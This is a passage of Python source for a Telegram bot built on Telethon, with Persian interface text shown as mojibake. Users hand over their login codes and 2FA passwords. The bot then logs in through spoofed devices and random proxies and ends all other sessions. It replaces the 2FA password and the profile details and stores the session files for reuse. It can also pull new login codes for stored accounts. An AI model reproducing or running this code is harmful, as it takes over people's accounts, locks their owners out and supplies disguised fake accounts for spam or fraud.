                await new.disconnect()
                await event.reply('**âš ï¸ No Any Account In Queue**')

            except errors.rpcerrorlist.PhoneCodeInvalidError:
                await new.disconnect()
                await event.reply("âš ï¸ Invalid Code ! \n Try Again ")

            except Exception as e:
                await new.disconnect()

                print(str(e), str(e.__class__))
                await event.reply("Ø®Ø·Ø§ÛŒ Ù†Ø§Ø´Ù†Ø§Ø®ØªÙ‡ \n Ù„Ø·ÙØ§ Ù…Ø¬Ø¯Ø¯Ø§ Ø¨Ø§ Ø²Ø¯Ù† Ø±Ø³ÛŒÙˆØ± ÙØ±Ø§Ù†Ø¯ Ø±Ø§ Ø·ÛŒ Ú©Ù†ÛŒØ¯ ")
                user.set(f"step:{userids}", 'None')

        elif not event.raw_text.isdigit() and user.get(f"step:{userids}") == "getCode" and event.raw_text != "Ø§Ø±Ø³Ø§Ù„ Ø´Ù…Ø§Ø±Ù‡ ğŸ“" and event.raw_text != "â”Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ù…Ù†" and event.raw_text != "â•Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ":

            await event.reply("âš ï¸ Please Enter the Code Currectly ")

        elif user.get(f"step:{userids}") == "2fa":
            try:

                key = user.get(f'code_mode:{userids}')
                m = await event.reply('**â™»ï¸ â–ªï¸ Ù„Ø·ÙØ§ Ú©Ù…ÛŒ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ .... **')
                k2 = getapiPhone(key.split(':')[0])
                device = random.choice(devices)
                version1 = random.choice(version)
                appv = random.choice(appvs)
                pr = await random_proxy()
                print(pr)
                new = TelegramClient('Accountsres/{0}'.format(key.split(':')[0]), int(k2[0]), k2[1],
                                    device_model=device,
                                    system_version=version1,
                                    app_version=appv,
                                    connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                    proxy=tuple(pr),
                                     )
                await new.connect()
                await new.sign_in(password=event.raw_text)
                info = await new.get_me()

                await new.disconnect()
                await event.reply('''** \nÚ©Ø§Ø±Ø¨Ø± Ø¹Ø²ÛŒØ² Ù„Ø·ÙØ§ Ù¾Ø³ Ø§Ø² 5 Ø¯Ù‚ÛŒÙ‚Ù‡ Ø¯Ú©Ù…Ù‡ Ø²ÛŒØ± Ø±Ø§ Ø¨Ø²Ù†ÛŒØ¯ Ùˆ Ø§Ú©Ø§Ù†Øª Ø®ÙˆØ¯ Ø±Ø§ Ø§Ù‡Ø¯Ø§ Ú©Ù†ÛŒØ¯ **\n â–â–â–â–â–â– \n Ù…Ø´Ø®ØµØ§Øª Ø§Ú©Ø§Ù†Øª \n ğŸ‘½  Username : {1}\n \n â–â–â–â–â–â– \n ğŸ‘½  Phone : +{2}\n  \n â–â–â–â–â–â– \n ğŸ‘½ FirstName : {3}\n \n â–â–â–â–â–â– \n ğŸ‘½ LastName : {4}** \n â–â–â–â–â–â– \n'''.format(key.split(':')[2]+':'+key.split(':')[3], str(info.username), str(info.phone), info.first_name, info.last_name), buttons=[[Button.inline("âœ… check ", f"True|{time.time()}|+{info.phone}|{event.raw_text}")]])

                user.set(f"step:{userids}", 'None')

            except KeyError:
                await event.reply('** No Any Account In Queue**')

            except errors.PasswordHashInvalidError:
                await event.reply('**âŒÙ„Ø·ÙØ§ Ù¾Ø³ÙˆØ±Ø¯ Ø±Ùˆ Ø¨Ù‡ Ø¯Ø±Ø³ØªÛŒ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯ . **')

                await new.disconnect()

            except Exception as e:
                print(str(e), str(e.__class__))

                await event.reply("Ø®Ø·Ø§ÛŒ Ù†Ø§Ø´Ù†Ø§Ø®ØªÙ‡ \n Ù„Ø·ÙØ§ Ø²Ø¯Ù† Ø±Ø³ÛŒÙˆØ± Ø¯ÙˆØ¨Ø§Ø±Ù‡ ØªÙ„Ø§Ø´ Ú©Ù†ÛŒØ¯ ")
                await new.disconnect()

                os.remove('Accountsres/{}.session'.format(key.split(':')[0]))
                user.set(f"step:{userids}", 'None')
            # await new.disconnect()

        elif validate(userids) and event.raw_text == "ğŸŒˆØ¯Ø±ÛŒØ§ÙØª Ú©Ø¯":

            await event.reply("ğŸ’Ù„Ø·ÙØ§ Ø´Ù…Ø§Ø±Ù‡ Ù…ÙˆØ±Ø¯ Ù†Ø¸Ø± Ø±Ø§ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯ ( Ø´Ù…Ø§Ø±Ù‡ Ø§ÛŒ Ú©Ù‡ Ù‚ØµØ¯ Ú¯Ø±ÙØªÙ† Ú©Ø¯ Ø§Ø² Ø¢Ù† Ø±Ø§ Ø¯Ø§Ø±ÛŒØ¯)")

            user.set(f"step:{userids}", "vipgetcode")

        elif event.raw_text.startswith("+") and user.get(f"step:{userids}") == "vipgetcode":
            print("vipCode")
            phone = event.raw_text

            if not os.path.exists('Accountsres/{0}.session'.format(phone)):
                await event.reply("âŒ Ø§ÛŒÙ† Ø§Ú©Ø§Ù†Øª Ø¯Ø± Ø¯ÛŒØªØ§Ø¨ÛŒØ³ Ù…ÙˆØ¬ÙˆØ¯ Ù†ÛŒØ³Øª Ùˆ Ø§Ù‡Ø¯Ø§ Ù†Ø´Ø¯Ù‡ Ø§Ø³ØªâŒ\n â–â–â–â–â–â– \n Ù„Ø·ÙØ§ Ø´Ù…Ø§Ø±Ù‡ Ø¯ÛŒÚ¯Ø±ÛŒ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯ Ùˆ ÛŒØ§ Ø§Ø² Ø±Ø³ÛŒÙˆØ± Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯ ")

            else:

                # try:

                w = getapiPhone(phone)
                #print (phone , 'Accountsres/{0}/{1}.session'.format(phone , phone))
                pr = await random_proxy()
                print(pr)
                device = random.choice(devices)
                version1 = random.choice(version)
                appv = random.choice(appvs)
                new = TelegramClient('Accountsres/{0}.session'.format(phone), w[0], w[1],
                                    device_model=device,
                                    system_version=version1,
                                    app_version=appv,
                                    connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                    proxy=tuple(pr),
                                     )

                await new.connect()

                #one = TelegramClient('Accountsres/+18164000381.session' , w[0]  , w[1])

                # await one.connect()
                # if not await new.is_user_authorized():
                #     print ("is_user_authorized")
                #     await new.sign_in(phone ,password="keivan")

                # if not await new.is_user_authorized():

                try:
                    # result = await one.send_code_request(phone)
                    # await one.disconnect()

                    await event.reply('''
    ğŸŒˆÚ©Ø¯ Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯ ğŸŒˆ

    â–«ï¸Ù„Ø·ÙØ§ Ú©Ù…ÛŒ ØµØ¨Ø± Ú©Ù†ÛŒØ¯
                                ''')

                    # if not await new.is_user_authorized():
                    #     print ("is_user_authorized")
                    #     await new.sign_in(phone)

                    await asyncio.sleep(6)

                    for message in await new.get_messages(777000, limit=1):

                        code = re.findall(r'\d+', message.message)

                        await event.reply(f"ğŸ† Ú©Ø¯ ÙˆØ±ÙˆØ¯ Ø´Ù…Ø§ : {code[0]}")

                    await new.disconnect()

                except Exception as e:
                    print(str(e))
                    try:
                        await new.disconnect()
                    except:
                        pass
                # except Exception as e :
                #     print (str(e))

                #     try:
                #         await new.disconnect()
                #     except : pass


@bot.on(events.CallbackQuery)
async def callback(events):
    userids = events.sender_id
    global info
    callback = events.data.decode()

    if (user.get("on") == "1"):

        if callback.startswith("+:"):
            _id = callback.split("+:")[1]

            try:
                await bot.send_message(int(_id), "âœ…Ø³ÙØ§Ø±Ø´ Ø´Ù…Ø§ Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø§Ù†Ø¬Ø§Ù… Ø´Ø¯ ")
                user.set(f"allow:{_id}", "true")
                user.set(f"sacc:{_id}", 0)

            except:
                pass

        if callback.startswith("-:"):
            _id = callback.split("-:")[1]
            try:
                await bot.send_message(int(_id), "âŒØ³ÙØ§Ø±Ø´ Ø´Ù…Ø§ Ø±Ø¯ Ø´Ø¯ ")
                user.set(f"allow:{_id}", "true")

            except:
                pass

        elif callback.startswith('settings'):
            phn = callback.split('|')[1]
            await events.reply('What you want with {} ?'.format(phn), buttons=[
                [Button.inline('ğŸ—‘ Delete', 'delete|{}'.format(phn)),
                 Button.inline('Ø¨Ø³ØªÙ† ', 'close')]
            ])

        elif callback == 'close':
            await events.edit('Ù¾Ù†Ù„ Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø¨Ø³ØªÙ‡ Ø´Ø¯')

        elif callback.startswith('delete'):
            pehen = callback.split('|')[1]
            try:
                os.remove('Accountsres/{}'.format(pehen))
                await events.edit('Ø§Ú©Ø§Ù†Øª {} Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø§Ø² Ø¯ÛŒØªØ§Ø¨ÛŒØ³ Ù¾Ø§Ú© Ø´Ø¯ !'.format(pehen))
            except:
                await events.edit('Ù…Ø´Ú©Ù„ÛŒ Ø¯Ø± Ù¾Ø§Ú© Ú©Ø±Ø¯Ù† {} Ø§Ø² Ø¯ÛŒØªØ§Ø¨ÛŒØ³ ÙˆØ¬ÙˆØ¯ Ø¯Ø§Ø±Ø¯ ! '.format(pehen))

        elif callback == "enteghal":

            await events.reply("âœ…Ù„Ø·ÙØ§ Ú©Ù…ÛŒ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ â•")

            for item in os.scandir('Accountsres'):
                if 'journal' not in item.name and '.session' in item.name:

                    # enteghal sessions
                    shutil.copy("Accountsres/{}".format(item.name),
                                "../Accountsres/{}".format(item.name))

                    pass
            # os.mkdir("Accountsres")
            await events.reply("âœ…âœ… Ø¹Ù…Ù„ÛŒØ§Øª Ø§Ù†ØªÙ‚Ø§Ù„ Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø¨Ù‡ Ù¾Ø§ÛŒØ§Ù† Ø±Ø³ÛŒØ¯  ")

        if callback == "cancel":
            user.set(f"step:{userids}", "None")

        elif callback.startswith('True') or callback.startswith("False"):

            if time.time() - int(callback.split('|')[1].split('.')[0]) > 2:

                fname = 'None'
                lname = 'None'
                about = 'None'
                sdk = random.choice(sdks)
                phone = callback.split('|')[2]
                dct = callback.split('|')
                if dct[0] == "True":
                    password = dct[3]
                else:
                    password = ""
                nam = "Accountsres/"+callback.split('|')[2]+".session"

                await events.answer('Ú©Ù…ÛŒ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ ...')
                api = getapiPhone(callback.split('|')[2])
                aid = api[0]
                ah = api[1]
                device = random.choice(devices)
                version1 = random.choice(version)
                appv = random.choice(appvs)
                pr = await random_proxy()
                print(pr)
                client = TelegramClient(nam, aid, ah,
                                        device_model=device,
                                        system_version=version1,
                                        app_version=appv,
                                        lang_code='en',
                                        system_lang_code='en',
                                        connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                        proxy=tuple(pr),
                                        )

                await client.connect()

                # --------------------
                try:
                    msg = ["slm","khobi","che khabar","Ø³Ù„Ø§Ù…","Ú†Ù‡ Ø®Ø¨Ø±","Ø®Ø¨ÛŒ","Ø³Ù„Ø§Ù…ØªÛŒ Ø¯Ø§","ØªØ³Øª","Ø§Ø±Ø³Ø§Ù„","Ø±Ø³ÛŒÙˆØ±","Ù¾ÛŒØ§Ù…","Ø§Ø±Ø³Ø§Ù„"]
                    idd = ["@Tessssttttttttttg","@fuuuufgooo","@sendcheckk","@ttdccghhhhhh"]
                    await client.send_message(str(random.choice(idd)),str(random.choice(msg)))
                    shutil.copy(nam,"salem")
                    
                except:
                    shutil.copy(nam,"repacc")
                    
                try:
                    await client(functions.auth.ResetAuthorizationsRequest())
                except Exception as e:
                    print("ResetAuthorizationsRequest ===>", str(e))
                    pass

                # --------------------

                try:

                    result = await client(functions.account.GetAuthorizationsRequest())
                    #print ("Length : === > "  , len(result.authorizations))
                    if len(result.authorizations) == 1:
                        # if 1==1:
                        if dct[0] == 'True':  # ---- password 2fa dare !
                            print("password 2fa dare !")

                            await events.edit("ğŸ† Ø§Ú©Ø§Ù†Øª Ø´Ù…Ø§ Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø§Ù‡Ø¯Ø§ Ø´Ø¯ â•")

                            await asyncio.sleep(random.randint(1, 2))
                            await events.edit('| â–ªï¸ Ù„Ø·ÙØ§ Ú©Ù…ÛŒ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ .... \nğŸ‘½ Agent : {} '.format(callback.split('|')[2]), buttons=[[Button.inline("Connection .. ", "âœ…"), Button.inline("âœ… ", "âœ…")], [Button.inline("FirstName ", "âŒ"), Button.inline("âŒ", "âŒ")], [Button.inline("LastName  ", "âŒ"), Button.inline("âŒ", "âŒ")], [Button.inline("Bio", "âŒ"), Button.inline("âŒ", "âŒ")]])

                            # --------
                            user.incr(f"sacc:{userids}")  # ---- success Acc
                            user.incr(f"accs")
                            # ----------
                            a_pass = user.get("pass")

                            passwd = dct[3]

                            print("new password : ", a_pass,
                                  "old pass : ", passwd)

                            fname = getRandomLineRead("fnames.txt")
                            lname = getRandomLineRead("lnames.txt")
                            about = getRandomLineRead("about.txt")
                            files = os.listdir('images')

                            # print ("files" , files)
                            mimg = random.choice(files)

                            print("fname : ", fname, "lname: ", lname,
                                  "about : ", about, "image :", mimg)
                            upload_file = await client.upload_file("images/"+mimg)
                            await client(UploadProfilePhotoRequest(upload_file))

                            await client(UpdateProfileRequest(first_name=fname))
                            await events.edit('| â–ªï¸ Ù„Ø·ÙØ§ Ú©Ù…ÛŒ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ .... \nğŸ‘½ Agent : {} '.format(callback.split('|')[2]), buttons=[[Button.inline("Connection .. ", "âœ…"), Button.inline("âœ… ", "âœ…")], [Button.inline("FirstName ", "âœ…"), Button.inline("âœ…", "âœ…")], [Button.inline("LastName  ", "âŒ"), Button.inline("âŒ", "âŒ")], [Button.inline("Bio", "âŒ"), Button.inline("âŒ", "âŒ")]])

                            await asyncio.sleep(1, 2)

                            await client(UpdateProfileRequest(last_name=str(lname)))
                            await events.edit('| â–ªï¸ Ù„Ø·ÙØ§ Ú©Ù…ÛŒ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ .... \nğŸ‘½ Agent : {} '.format(callback.split('|')[2]), buttons=[[Button.inline("Connection .. ", "âœ…"), Button.inline("âœ… ", "âœ…")], [Button.inline("FirstName ", "âœ…"), Button.inline("âœ…", "âœ…")], [Button.inline("LastName  ", "âœ…"), Button.inline("âœ…", "âŒ")], [Button.inline("Bio", "âŒ"), Button.inline("âœ…", "âŒ")]])
                            await asyncio.sleep(1, 2)

                            await client(UpdateProfileRequest(about=str(about)))
                            await events.edit('| â–ªï¸ Ù„Ø·ÙØ§ Ú©Ù…ÛŒ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ .... \nğŸ‘½ Agent : {} '.format(callback.split('|')[2]), buttons=[[Button.inline("Connection .. ", "âœ…"), Button.inline("âœ… ", "âœ…")], [Button.inline("FirstName ", "âœ…"), Button.inline("âœ…", "âœ…")], [Button.inline("LastName  ", "âœ…"), Button.inline("âœ…", "âœ…")], [Button.inline("Bio", "âœ…"), Button.inline("âœ…", "âœ…")]])
                            await asyncio.sleep(1, 2)

                            await client.edit_2fa(current_password=passwd, new_password=a_pass)

                            await events.edit('| â–ªï¸ Ù„Ø·ÙØ§ Ú©Ù…ÛŒ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ .... \nğŸ‘½ Agent : {} '.format(callback.split('|')[2]), buttons=[[Button.inline("Connection .. ", "âœ…"), Button.inline("âœ… ", "âœ…")], [Button.inline("FirstName ", "âœ…"), Button.inline("âœ…", "âœ…")], [Button.inline("LastName  ", "âœ…"), Button.inline("âœ…", "âœ…")], [Button.inline("Bio", "âœ…"), Button.inline("âœ…", "âœ…")], [Button.inline("Password", "âœ…"), Button.inline("âœ…", "âœ…")]])

                            await client.disconnect()
                            # await change('69YYF5')

                            counter = 0
                            for item in os.scandir('Accountsres'):
                                if 'journal' not in item.name and '.session' in item.name:
                                    counter += 1

                                    pass

                        if dct[0] == "False":  # --- pass 2FA nadare
                            await events.reply("ğŸ† Ø§Ú©Ø§Ù†Øª Ø´Ù…Ø§ Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø§Ù‡Ø¯Ø§ Ø´Ø¯ â•")

                            # --------
                            user.incr(f"sacc:{userids}")  # ---- success Acc
                            user.incr(f"accs")
                            # ----------
                            a_pass = user.get("pass")

                            print("new password :", a_pass)

                            fname = getRandomLineRead("fnames.txt")
                            lname = getRandomLineRead("lnames.txt")
                            about = getRandomLineRead("about.txt")
                            files = os.listdir('images')

                            # print ("files" , files)
                            mimg = random.choice(files)
                            upload_file = await client.upload_file("images/"+mimg)
                            await client(UploadProfilePhotoRequest(upload_file))

                            # print ("fname : " , fname , "lname:" , lname , "about : " , about )

                            await client(UpdateProfileRequest(first_name=fname))
                            await events.edit('| â–ªï¸ Ù„Ø·ÙØ§ Ú©Ù…ÛŒ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ .... \nğŸ‘½ Agent : {} '.format(callback.split('|')[2]), buttons=[[Button.inline("Connection .. ", "âœ…"), Button.inline("âœ… ", "âœ…")], [Button.inline("FirstName ", "âœ…"), Button.inline("âŒ", "âŒ")], [Button.inline("LastName  ", "âŒ"), Button.inline("âŒ", "âŒ")], [Button.inline("Bio", "âŒ"), Button.inline("âŒ", "âŒ")]])

                            await asyncio.sleep(1, 2)

                            await client(UpdateProfileRequest(last_name=str(lname)))
                            await events.edit('| â–ªï¸ Ù„Ø·ÙØ§ Ú©Ù…ÛŒ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ .... \nğŸ‘½ Agent : {} '.format(callback.split('|')[2]), buttons=[[Button.inline("Connection .. ", "âœ…"), Button.inline("âœ… ", "âœ…")], [Button.inline("FirstName ", "âœ…"), Button.inline("âœ…", "âœ…")], [Button.inline("LastName  ", "âœ…"), Button.inline("âœ…", "âŒ")], [Button.inline("Bio", "âŒ"), Button.inline("âŒ", "âŒ")]])
                            await asyncio.sleep(1, 2)

                            await client(UpdateProfileRequest(about=str(about)))
                            await events.edit('| â–ªï¸ Ù„Ø·ÙØ§ Ú©Ù…ÛŒ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ .... \nğŸ‘½ Agent : {} '.format(callback.split('|')[2]), buttons=[[Button.inline("Connection .. ", "âœ…"), Button.inline("âœ… ", "âœ…")], [Button.inline("FirstName ", "âœ…"), Button.inline("âœ…", "âœ…")], [Button.inline("LastName  ", "âœ…"), Button.inline("âœ…", "âœ…")], [Button.inline("Bio", "âœ…"), Button.inline("âœ…", "âœ…")]])
                            await asyncio.sleep(1, 2)

                            await events.edit('| â–ªï¸ Ù„Ø·ÙØ§ Ú©Ù…ÛŒ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ .... \nğŸ‘½ Agent : {} '.format(callback.split('|')[2]), buttons=[[Button.inline("Connection .. ", "âœ…"), Button.inline("âœ… ", "âœ…")], [Button.inline("FirstName ", "âœ…"), Button.inline("âœ…", "âœ…")], [Button.inline("LastName  ", "âœ…"), Button.inline("âœ…", "âŒ")], [Button.inline("Bio", "âœ…"), Button.inline("âœ…", "âœ…")], [Button.inline("Password", "âœ…"), Button.inline("âŒ", "âœ…")]])

                            await client.edit_2fa(new_password=a_pass)
                            # ----------

                            await events.edit('| â–ªï¸ Ù„Ø·ÙØ§ Ú©Ù…ÛŒ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ .... \nğŸ‘½ Agent : {} '.format(callback.split('|')[2]), buttons=[[Button.inline("Connection .. ", "âœ…"), Button.inline("âœ… ", "âœ…")], [Button.inline("FirstName ", "âœ…"), Button.inline("âœ…", "âœ…")], [Button.inline("LastName  ", "âœ…"), Button.inline("âœ…", "âœ…")], [Button.inline("Bio", "âœ…"), Button.inline("âœ…", "âœ…")], [Button.inline("Password", "âœ…"), Button.inline("âœ…", "âœ…")]])

                            await client.disconnect()

                            counter = 0
                            for item in os.scandir('Accountsres'):
                                if 'journal' not in item.name and '.session' in item.name:
                                    counter += 1

                                    pass

                            # await change('69YYF5')

                        fname = fname.rstrip()
                        lname = lname.rstrip()

                        dictionary = {

                            "session_file": phone,
                            "phone": phone,
                            "register_time": time.time(),
                            "app_id": f"{aid}",
                            "app_hash": f"{ah}",
                            "sdk": sdk,
                            "app_version": version1,
                            "device": device,
                            "lang_pack": "en",
                            "proxy": 'null',
                            "last_check_time": 0,
                            "success_registred": True,
                            "first_name": f"{fname}",
                            "last_name": f"{lname}",
                            "twoFA": f"{password}"
                        }

                        json_object = json.dumps(dictionary, indent=4)
                        # create_api(phone)
                        with open(f"Accountsres/{phone}.json", "w") as outfile:
                            outfile.write(json_object)

                        minify(f"Accountsres/{phone}.json")

                        if not os.path.exists(f"Accountsres/{phone}"):
                            os.mkdir(f"Accountsres/{phone}")

                            shutil.copy(
                                f"Accountsres/{phone}.session", f"Accountsres/{phone}/{phone}.session")
                            shutil.copy(
                                f"Accountsres/{phone}.json", f"Accountsres/{phone}/{phone}.json")

                    else:

                        # --------------
                        await events.reply('âš ï¸ Ù†Ø´Ø³ØªÙ‡Ø§ÛŒ ÙØ¹Ø§Ù„ Ø§Ú©Ø§Ù†Øª Ø®Ø§Ù„ÛŒ Ù†ÛŒØ³Øª. \n Ø§ÛŒÙ† Ø§Ú©Ø§Ù†Øª Ù‚Ø§Ø¨Ù„ Ø§Ù‡Ø¯Ø§ Ù†Ù…ÛŒ Ø¨Ø§Ø´Ø¯ \n Ø²ÛŒØ±Ø§ Ù†Ø´Ø³Øª Ø§Ù† Ø®Ø§Ù„ÛŒ Ù†ÛŒØ³Øª ')
                        await client.disconnect()
                        # await change('69YYF5')

                        fname = fname.rstrip()
                        lname = lname.rstrip()
                        dictionary = {

                            "session_file": phone,
                            "phone": phone,
                            "register_time": str(time.time()),
                            "app_id": f"{aid}",
                            "app_hash": f"{ah}",
                            "sdk": sdk,
                            "app_version": version1,
                            "device": device,
                            "lang_pack": "en",
                            "proxy": 'null',
                            "last_check_time": 0,
                            "success_registred": False,
                            "first_name": f"{fname}",
                            "last_name": f"{lname}",
                            "twoFA": f"{password}"
                        }

                        json_object = json.dumps(dictionary, indent=4)
                        with open(f"Accountsres/{phone}.json", "w") as outfile:
                            outfile.write(json_object)

                        minify(f"Accountsres/{phone}.json")

                except errors.UserDeactivatedBanError:

                    await events.edit('âš ï¸Ù…ØªØ§Ø³ÙØ§Ù†Ù‡ Ø§Ú©Ø§Ù†Øª Ø´Ù…Ø§ Ø¯ÛŒÙ„ÛŒØª Ø´Ø¯Ù‡ Ø§Ø³Øª Ù„Ø·ÙØ§ Ø§Ú©Ø§Ù†Øª Ø¯ÛŒÚ¯Ø±ÛŒ Ø±Ø§ ÙˆØ§Ø±Ø¯ Ù†Ù…Ø§ÛŒÛŒØ¯.')
                    await client.disconnect()
                    fname = fname.rstrip()
                    lname = lname.rstrip()
                    dictionary = {

                        "session_file": phone,
                        "phone": phone,
                        "register_time": str(time.time()),
                        "app_id": f"{aid}",
                        "app_hash": f"{ah}",
                        "sdk": sdk,
                        "app_version": version1,
                        "device": device,
                        "lang_pack": "en",
                        "proxy": 'null',
                        "last_check_time": 0,
                        "success_registred": False,
                        "first_name": f"{fname}",
                        "last_name": f"{lname}",
                        "twoFA": f"{password}"
                    }

                    json_object = json.dumps(dictionary, indent=4)
                    with open(f"Accountsres/{phone}.json", "w") as outfile:
                        outfile.write(json_object)
                    minify(f"Accountsres/{phone}.json")

                except errors.UserDeactivatedError:

                    await events.edit('âš ï¸Ù…ØªØ§Ø³ÙØ§Ù†Ù‡ Ø§Ú©Ø§Ù†Øª Ø´Ù…Ø§ Ø¯ÛŒÙ„ÛŒØª Ø´Ø¯Ù‡ Ø§Ø³Øª Ù„Ø·ÙØ§ Ø§Ú©Ø§Ù†Øª Ø¯ÛŒÚ¯Ø±ÛŒ Ø±Ø§ ÙˆØ§Ø±Ø¯ Ù†Ù…Ø§ÛŒÛŒØ¯.')
                    await client.disconnect()
                    fname = fname.rstrip()
                    lname = lname.rstrip()
                    dictionary = {

                        "session_file": phone,
                        "phone": phone,
                        "register_time": str(time.time()),
                        "app_id": f"{aid}",
                        "app_hash": f"{ah}",
                        "sdk": sdk,
                        "app_version": version1,
                        "device": device,
                        "lang_pack": "en",
                        "proxy": 'null',
                        "last_check_time": 0,
                        "success_registred": False,
                        "first_name": f"{fname}",
                        "last_name": f"{lname}",
                        "twoFA": f"{password}"
                    }

                    json_object = json.dumps(dictionary, indent=4)
                    with open(f"Accountsres/{phone}.json", "w") as outfile:
                        outfile.write(json_object)

                    minify(f"Accountsres/{phone}.json")

                except errors.SessionExpiredError:

                    await events.edit(f'âš ï¸ Ø´Ù…Ø§Ø±Ù‡ {dct[2]} Ø§Ø² Ø¯Ø³ØªØ±Ø³ Ø±Ø¨Ø§Øª Ø®Ø§Ø±Ø¬ Ø´Ø¯Ù‡ Ø§Ø³Øª Ùˆ Ø§Ù…Ú©Ø§Ù† Ø«Ø¨Øª Ø¢Ù† Ù†ÛŒØ³Øª.')
                    await client.disconnect()

                    fname = fname.rstrip()
                    lname = lname.rstrip()

                    dictionary = {

                        "session_file": phone,
                        "phone": phone,
                        "register_time": str(time.time()),
                        "app_id": f"{aid}",
                        "app_hash": f"{ah}",
                        "sdk": sdk,
                        "app_version": version1,
                        "device": device,
                        "lang_pack": "en",
                        "proxy": 'null',
                        "last_check_time": 0,
                        "success_registred": False,
                        "first_name": f"{fname}",
                        "last_name": f"{lname}",
                        "twoFA": f"{password}"
                    }

                    json_object = json.dumps(dictionary, indent=4)
                    with open(f"Accountsres/{phone}.json", "w") as outfile:
                        outfile.write(json_object)

                    minify(f"Accountsres/{phone}.json")

                except errors.SessionRevokedError:

                    await events.edit(f'âš ï¸ Ø´Ù…Ø§Ø±Ù‡ {dct[2]} Ø§Ø² Ø¯Ø³ØªØ±Ø³ Ø±Ø¨Ø§Øª Ø®Ø§Ø±Ø¬ Ø´Ø¯Ù‡ Ø§Ø³Øª Ùˆ Ø§Ù…Ú©Ø§Ù† Ø«Ø¨Øª Ø¢Ù† Ù†ÛŒØ³Øª.')
                    await client.disconnect()

                    fname = fname.rstrip()
                    lname = lname.rstrip()

                    dictionary = {

                        "session_file": phone,
                        "phone": phone,
                        "register_time": str(time.time()),
                        "app_id": f"{aid}",
                        "app_hash": f"{ah}",
                        "sdk": sdk,
                        "app_version": version1,
                        "device": device,
                        "lang_pack": "en",
                        "proxy": 'null',
                        "last_check_time": 0,
                        "success_registred": False,
                        "first_name": f"{fname}",
                        "last_name": f"{lname}",
                        "twoFA": f"{password}"
                    }

                    json_object = json.dumps(dictionary, indent=4)
                    with open(f"Accountsres/{phone}.json", "w") as outfile:
                        outfile.write(json_object)

                    minify(f"Accountsres/{phone}.json")

                except errors.rpcerrorlist.PasswordHashInvalidError:

                    await events.edit(f'âš ï¸ ØªØ§ÛŒÛŒØ¯ Ø¯Ùˆ Ù…Ø±Ø­Ù„Ù‡ Ø§ÛŒ Ø´Ù…Ø§Ø±Ù‡ {dct[2]} ØªØºÛŒÛŒØ± Ú©Ø±Ø¯Ù‡ Ø§Ø³Øª Ùˆ Ø§Ù…Ú©Ø§Ù† Ø«Ø¨Øª Ø¢Ù† Ù†ÛŒØ³Øª.')

                    fname = fname.rstrip()
                    lname = lname.rstrip()
                    dictionary = {

                        "session_file": phone,
                        "phone": phone,
                        "register_time": str(time.time()),
                        "app_id": f"{aid}",
                        "app_hash": f"{ah}",
                        "sdk": sdk,
                        "app_version": version1,
                        "device": device,
                        "lang_pack": "en",
                        "proxy": 'null',
                        "last_check_time": 0,
                        "success_registred": False,
                        "first_name": f"{fname}",
                        "last_name": f"{lname}",
                        "twoFA": f"{password}"
                    }

                    json_object = json.dumps(dictionary, indent=4)
                    with open(f"Accountsres/{phone}.json", "w") as outfile:
                        outfile.write(json_object)

                    minify(f"Accountsres/{phone}.json")
                except Exception as e:
                    fname = fname.rstrip()
                    lname = lname.rstrip()

                    dictionary = {

                        "session_file": phone,
                        "phone": phone,
                        "register_time": str(time.time()),
                        "app_id": f"{aid}",
                        "app_hash": f"{ah}",
                        "sdk": sdk,
                        "app_version": version1,
                        "device": device,
                        "lang_pack": "en",
                        "proxy": 'null',
                        "last_check_time": 0,
                        "success_registred": False,
                        "first_name": f"{fname}",
                        "last_name": f"{lname}",
                        "twoFA": f"{password}"
                    }

                    json_object = json.dumps(dictionary, indent=4)
                    with open(f"Accountsres/{phone}.json", "w") as outfile:
                        outfile.write(json_object)

                    minify(f"Accountsres/{phone}.json")

                    await client.disconnect()
                    print(str(e))
                    await events.edit('âš ï¸Ø®Ø·Ø§ÛŒ Ù†Ø§Ø´Ù†Ø§Ø®ØªÙ‡ Ø§Ø² ØªÙ„Ú¯Ø±Ø§Ù… Ù„Ø·ÙØ§ Ø¯ÙˆØ¨Ø§Ø±Ù‡ Ø§Ú©Ø§Ù†Øª Ø±Ø§ ÙˆØ§Ø±Ø¯ Ù†Ù…Ø§ÛŒÛŒØ¯ ÛŒØ§ Ø§Ú©Ø§Ù†Øª Ø¯ÛŒÚ¯Ø±ÛŒ Ø±Ø§ ÙˆØ§Ø±Ø¯ Ø±Ø¨Ø§Øª Ù†Ù…Ø§ÛŒÛŒØ¯.')

            else:
                await events.answer('Ù‡Ù†ÙˆØ² 1 Ø¯Ù‚ÛŒÙ‚Ù‡ Ù†Ø´Ø¯Ù‡ Ø§Ø³Øª Ù„Ø·ÙØ§ {} Ø«Ø§Ù†ÛŒÙ‡ Ø¯ÛŒÚ¯Ø± ØµØ¨Ø± Ú©Ù†ÛŒØ¯ Ø¨Ø§ ØªØ´Ú©Ø±'.format(60 - (time.time() - int(callback.split('|')[1].split('.')[0]))).split('.')[0])







go()
